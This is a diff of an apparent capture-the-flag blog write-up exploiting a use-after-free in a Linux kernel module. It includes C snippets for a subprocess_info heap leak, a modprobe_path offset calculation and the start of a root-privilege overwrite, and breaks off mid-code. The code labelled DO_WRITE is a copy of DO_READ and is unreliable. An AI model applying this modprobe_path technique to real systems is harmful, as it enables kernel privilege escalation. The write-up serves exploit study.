@@ -1,13 +1,13 @@
 <!DOCTYPE html>
-<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<html lang="en"><head>
     <title>Waheyyyyyyy</title>
     <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
     <meta content="utf-8" http-equiv="encoding">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="format-detection" content="telephone=no" />
     <meta name="theme-color" content="#000084" />
-    <link rel="icon" href="http://localhost:1313//favicon.ico">
-    <link rel="canonical" href="http://localhost:1313/">
+    <link rel="icon" href="https://waheyy.github.io//favicon.ico">
+    <link rel="canonical" href="https://waheyy.github.io/">
     
     
 </head>
@@ -16,7 +16,7 @@
     <div class="navbar-inner">
         <div class="container">
             <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
-            <a class="brand" href="http://localhost:1313/">Waheyyyyyyy</a>
+            <a class="brand" href="https://waheyy.github.io/">Waheyyyyyyy</a>
             <div class="nav-collapse collapse">
                 <ul class="nav">
                     
@@ -86,36 +86,394 @@
 <p><code>modprobe</code> is a program used to load and unload kernel modules. The path to it is a kernel global variable, which by default is <code>/sbin/modprobe</code>. Very cool but how is it helpful?</p>
 <p>Well the path is stored in a kernel symbol <code>modprobe_path</code> and is also in a writable page. The program that is stored in <code>modprobe_path</code> also gets executed if we try to call <code>execve()</code> on a file whose magic bytes are unknown to the system. Sooooooooooooooooooo if we somehow overwrite <code>modprobe_path</code> and change the path to another program that we control, when a file with an unknown file signature is ran, that program is run in kernel mode which gives me arbitrary code execution with root privileges.</p>
 <h4 id="binary-analysis">Binary analysis:</h4>
-<p>Now, I did the challenge with source code but during the actual event source code was not given so I shall also practice my ghidra skills here.</p>
-<h4 id="setup-stuff">Setup stuff:</h4>
-<p>pic of req and box box size blah blah</p>
-<h4 id="do_create">DO_CREATE:</h4>
-<p>Allocates a box into the GFG_KERNEL account. The size of box is 0x60 so it goes into the kmalloc-96 cache. You also can add a note in.</p>
+<p>Some set up stuff at the start:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> req {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> idx;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> name_addr;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> note_size;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> note_addr;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> box {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">0x50</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> note_size; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> note_addr;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> box_array[<span style="color:#ae81ff">0x30</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> box_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span></code></pre></div><h4 id="do_create">DO_CREATE:</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DO_CREATE: { 
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (box_count <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x30</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>storage_mutex); 
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Too many boxes!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  box <span style="color:#f92672">=</span> <span style="color:#a6e22e">kmalloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> box), GFP_KERNEL);
+</span></span><span style="display:flex;"><span>  ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(buf, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.name_addr, <span style="color:#ae81ff">0x50</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>box<span style="color:#f92672">-&gt;</span>name, buf, <span style="color:#ae81ff">0x50</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (user_data.note_size <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      note <span style="color:#f92672">=</span> <span style="color:#a6e22e">kmalloc</span>(user_data.note_size, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>      box<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>) note; 
+</span></span><span style="display:flex;"><span>      box<span style="color:#f92672">-&gt;</span>note_size <span style="color:#f92672">=</span> user_data.note_size;
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Copy information to the note
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(buf, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.note_addr, box<span style="color:#f92672">-&gt;</span>note_size);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memcpy</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) note, buf, box<span style="color:#f92672">-&gt;</span>note_size<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  box_array[box_count] <span style="color:#f92672">=</span> box; 
+</span></span><span style="display:flex;"><span>  box_count <span style="color:#f92672">=</span> box_count <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>storage_mutex); 
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; 
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Allocates a box into the GFP_KERNEL account. The size of box is 0x60 so it goes into the kmalloc-96 cache. You also can add a note by passing in note address and size along with the req struct.</p>
 <h4 id="do_read">DO_READ:</h4>
-<p>Reads the name and note from the box into the buffer provided by the req struct.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DO_READ: {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (user_data.idx <span style="color:#f92672">&gt;</span> (box_count <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>storage_mutex); 
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Invalid idx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      box <span style="color:#f92672">=</span> box_array[user_data.idx]; 
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memcpy</span>(buf, <span style="color:#f92672">&amp;</span>box<span style="color:#f92672">-&gt;</span>name, <span style="color:#ae81ff">0x50</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>      ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>((<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>)user_data.name_addr, buf, <span style="color:#ae81ff">0x50</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (box<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> box<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x10</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(buf)); 
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">memcpy</span>(buf, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)box<span style="color:#f92672">-&gt;</span>note_addr, box<span style="color:#f92672">-&gt;</span>note_size<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>          ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>((<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>)user_data.note_addr, buf, box<span style="color:#f92672">-&gt;</span>note_size); 
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>storage_mutex); 
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; 
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>Reads the name and note from the box into the buffer provided by the req struct.</p>
 <h4 id="do_write">DO_WRITE:</h4>
-<p>Writes a name and note to the box.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DO_READ: {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (user_data.idx <span style="color:#f92672">&gt;</span> (box_count <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>storage_mutex); 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Invalid idx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    box <span style="color:#f92672">=</span> box_array[user_data.idx]; 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(buf, <span style="color:#f92672">&amp;</span>box<span style="color:#f92672">-&gt;</span>name, <span style="color:#ae81ff">0x50</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>((<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>)user_data.name_addr, buf, <span style="color:#ae81ff">0x50</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (box<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> box<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x10</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(buf)); 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memcpy</span>(buf, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)box<span style="color:#f92672">-&gt;</span>note_addr, box<span style="color:#f92672">-&gt;</span>note_size<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>((<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>)user_data.note_addr, buf, box<span style="color:#f92672">-&gt;</span>note_size); 
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>storage_mutex); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Writes a name and note to the box.</p>
 <h4 id="do_resize">DO_RESIZE:</h4>
-<p>Resizes the note and copies the new note into it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DO_RESIZE: {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (user_data.idx <span style="color:#f92672">&gt;</span> (box_count <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>storage_mutex); 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Invalid idx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    box <span style="color:#f92672">=</span> box_array[user_data.idx]; 
+</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(<span style="color:#f92672">&amp;</span>box<span style="color:#f92672">-&gt;</span>name, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.name_addr, <span style="color:#ae81ff">0x50</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (user_data.note_size <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">kfree</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)box<span style="color:#f92672">-&gt;</span>note_addr);
+</span></span><span style="display:flex;"><span>        note <span style="color:#f92672">=</span> <span style="color:#a6e22e">kmalloc</span>(user_data.note_size, GFP_KERNEL); 
+</span></span><span style="display:flex;"><span>        box<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)note; 
+</span></span><span style="display:flex;"><span>        box<span style="color:#f92672">-&gt;</span>note_size <span style="color:#f92672">=</span> user_data.note_size; 
+</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(note, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.note_addr, user_data.note_size);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>storage_mutex); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Resizes the note and copies the new note into it.</p>
 <h4 id="do_delete">DO_DELETE:</h4>
-<p>Deletes a box and holy crap finally a vulnerability. The function frees the note and nulls it but when it frees the box it does not null it, leaving a dangling pointer that we can fandangle via a use-after-free(UAF).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DO_DELETE: {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (user_data.idx <span style="color:#f92672">&gt;</span> (box_count <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>storage_mutex); 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Invalid idx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    box <span style="color:#f92672">=</span> box_array[user_data.idx]; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (box<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> box<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x10</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">kfree</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)box<span style="color:#f92672">-&gt;</span>note_addr); 
+</span></span><span style="display:flex;"><span>        box<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; 
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kfree</span>(box); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>storage_mutex); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Deletes a box and holy crap finally a vulnerability. The function frees the note and nulls it but when it frees the box it does not null it, leaving a dangling pointer to the box that we can fandangle via a use-after-free(UAF). Knowing we have the ability to read or write to a box even after freeing it, what can we do?</p>
 <h4 id="exploit">Exploit:</h4>
-<p>Since KASLR is active, we are going to need a kernel leak to calculate the address of <code>modprobe path</code>. How in the frick frack snick snack do we do that here?</p>
+<p>Firstly, lets get some minor setup for the exploit out of the way. We should pin all threads of the process to one CPU core so all allocations come from the same cache.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">cpuaff</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Setting cpu affinity</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">cpu_set_t</span> cpu;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">CPU_ZERO</span>(<span style="color:#f92672">&amp;</span>cpu);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">CPU_SET</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>cpu);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sched_setaffinity</span>(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">cpu_set_t</span>), <span style="color:#f92672">&amp;</span>cpu)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Sched_setaffinity not working</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Since KASLR is active, we are going to need a kernel leak to calculate the address of <code>modprobe path</code>. How in the frick frack snick snack do we do that here?</p>
 <p>Well, in my experience so far, kernel heap challenges often get leaks by overlapping kernel structs instead of something like the unsorted bin libc leak in userland. Since I can read the boxes name and note, I wanna get something that fits into the kmalloc-96 cache and also gets me a kernel leak so scrolling through <a href="https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/">this site</a> we find a struct called <code>subprocess_info</code> that fits into kmalloc-96 and <code>work.func</code> can be leaked to get the kernel base yipee.</p>
 <p>So we allocate 2 boxes, box0 and box1. We free box0 then immediately reclaim its spot with a <code>subprocess_info</code> by calling <code>socket(22, AF_INET, 0)</code>.</p>
-<p>Since box0 is deleted but not nulled we can still read it and ta da, we get the information that <code>subprocess_info</code> is holding.</p>
-<p>This is the struct and we can see that it has a work_struct member then we dig deeper and we see that the work.func leak we need is at index 3 of the leaks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#a6e22e">create</span>(name, <span style="color:#ae81ff">0x100</span>, note);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">create</span>(name, <span style="color:#ae81ff">0x100</span>, note);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">dodelete</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">socket</span>(<span style="color:#ae81ff">22</span>, AF_INET, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">doread</span>(<span style="color:#ae81ff">0</span>, readname, readnote);
+</span></span></code></pre></div><p>Since box0 is deleted but not nulled we can still read it and ta da, we get the information that <code>subprocess_info</code> is holding.</p>
+<p><img src="/post/secretstorage/images/subprocess_info.jpg" alt="subprocess_info"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> subprocess_info {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> work_struct work;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> completion <span style="color:#f92672">*</span>complete;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>path;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> wait;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> retval;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>init)(<span style="color:#66d9ef">struct</span> subprocess_info <span style="color:#f92672">*</span>info, <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>new);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>cleanup)(<span style="color:#66d9ef">struct</span> subprocess_info <span style="color:#f92672">*</span>info);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>data;
+</span></span><span style="display:flex;"><span>} __randomize_layout;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> work_struct {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">atomic_long_t</span> data;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> list_head entry;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">work_func_t</span> func;
+</span></span></code></pre></div><p>This is the struct and we can see that it has a work_struct member then we dig deeper and we see that the work.func leak we need is at index 3 of the leaks. (1st 8 bytes for <code>data</code>, 16 bytes for <code>list_head</code> and finally 8 bytes for <code>work.func</code>)</p>
 <p>If we start the qemu with root we can also check that the leak is pointing to <code>call_usermodehelper_exec_work</code>.</p>
-<p>Since the address <code>call_usermodehelper_exec_work</code> and <code>modprobe_path</code> are all relative we can just do some math to find <code>modprobe_path</code>.
-comment the eqn i did</p>
-<p>Now that we have the <code>modprobe_path</code> address we need to resize the note to go into 0x60 cache and overwrite over box0 again and make sure that the new note size is big enough and the note address is the address of <code>modprobe_path</code>.</p>
+<p><img src="/post/secretstorage/images/call_usermodehelper_exec_work.jpg" alt="call_usermodehelper_exec_work"></p>
+<p>Since the address <code>call_usermodehelper_exec_work</code> and <code>modprobe_path</code> are all relative we can just do some math to find <code>modprobe_path</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">//offset of mpp from call_usermodehelper_exec_work is 0x1a94080
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint64_t</span> mpp <span style="color:#f92672">=</span> ((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)readname)[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1a94080</span>;
+</span></span></code></pre></div><p>Now that we have the <code>modprobe_path</code> address we need to resize the note to go into 0x60 cache and overwrite over box0 again and making sure that the new note size is big enough and the note address is the address of <code>modprobe_path</code>.</p>
 <p>Then we write to box0 with the new note being the path of the script that I want ran with root privileges.</p>
-<p>The script basically copies the stuff in <code>/dev/sda</code> into <code>/tmp/flag</code> as well as granting it full permissions and makes it executable. Then it makes an unknown file and runs it which should then trigger <code>modprobe_path</code> and run the script and now the flag from <code>/dev/sda</code> is inside <code>/tmp/flag</code> and we can view it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> overwrite[<span style="color:#ae81ff">0x10</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(overwrite, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(overwrite));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strcpy</span>(overwrite, <span style="color:#e6db74">&#34;/tmp/x</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> resize[<span style="color:#ae81ff">0x100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
